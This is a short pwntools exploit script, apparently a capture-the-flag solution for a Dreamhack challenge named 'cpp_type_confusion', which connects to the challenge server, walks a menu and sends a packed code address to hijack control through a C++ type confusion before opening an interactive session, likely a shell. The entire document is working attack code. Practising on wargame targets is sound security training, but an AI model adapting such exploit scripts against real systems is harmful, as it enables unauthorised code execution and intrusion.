from pwn import *
r = remote("host1.dreamhack.games", 23108)
elf = ELF("./cpp_type_confusion")
r.sendline("1")
r.sendline("2")
r.sendline("3")
r.sendline(p64(0x400fa6))
r.sendline("4")
r.sendline("3")
r.interactive()
